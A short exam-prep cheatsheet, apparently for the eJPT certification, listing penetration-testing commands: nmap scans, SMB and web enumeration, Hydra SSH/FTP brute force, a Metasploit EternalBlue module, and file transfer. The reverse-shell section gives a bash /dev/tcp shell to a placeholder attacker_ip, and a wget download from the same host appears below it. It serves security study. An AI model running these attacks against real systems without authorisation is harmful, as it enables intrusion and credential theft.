# Cheatsheet
## This folder contains a quick references while engaged in the eJPT exam.

# Scanning
```
#Basic scan
nmap -sC -sV -oN scan.txt 10.10.10.10

#Full port scan
nmap -p- 10.10.10.10

#Aggressive scan
nmap -A 10.10.10.10

#DNS lookup
nslookup target.com
```
# Network Scanning/Enumeration
```
#Service version detection
nmap -sV target_ip

#OS detection
nmap -O target_ip

#Scan specific ports
nmap -p 21,22,80,443 target_ip
```

# Usful Enumeration Tools
```
#enum4linux -a target_ip

#smbclient -L //target_ip

#nc -nv target_ip 80
```

# Web App Testing
```
#Directory brute force
gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt

#Web vulnerability scan
nikto -h http://target

#Directory scan
dirb http://target
```

# Password attacks
```
#Hydra brute force SSH
hydra -l root -P passwords.txt ssh://target_ip

#FTP brute force
hydra -l admin -P passwords.txt ftp://target_ip

#Crack hashes
john hash.txt
```

# Exploitation
```
#Search exploits
searchsploit apache 2.4

#Start metasploit
msfconsole

#Search modules
search exploit smb

#Use exploit
use exploit/windows/smb/ms17_010_eternalblue

#Set target
set RHOSTS target_ip
```
# Reverse Shell
```
#Netcat listener
nc -lvnp 4444

#Bash reverse shell
bash -i >& /dev/tcp/attacker_ip/4444 0>&1
```
# Useful File Transfer
```
#Python web server
python3 -m http.server 8000

#Download file
wget http://attacker_ip/file

#Netcat transfer
nc target_ip 4444 < file.txt
```
